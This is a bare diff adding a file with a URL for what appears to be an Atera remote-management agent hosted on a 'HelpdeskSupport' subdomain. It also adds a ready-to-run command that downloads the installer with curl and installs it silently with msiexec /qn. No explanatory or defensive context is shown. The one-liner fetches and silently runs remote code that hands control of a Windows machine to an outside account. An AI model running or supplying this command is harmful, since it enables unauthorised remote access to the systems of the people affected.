@@ -1,0 +1,5 @@
+https://HelpdeskSupport1712282965983.servicedesk.atera.com/GetAgent/Windows/?cid=3&fid=5&aid=001Q300000BxAx6IAF
+
+curl -L -o setup.msi "https://HelpdeskSupport1712282965983.servicedesk.atera.com/GetAgent/Windows/?cid=3&fid=5&aid=001Q300000BxAx6IAF" && msiexec /i setup.msi /qn
+
+
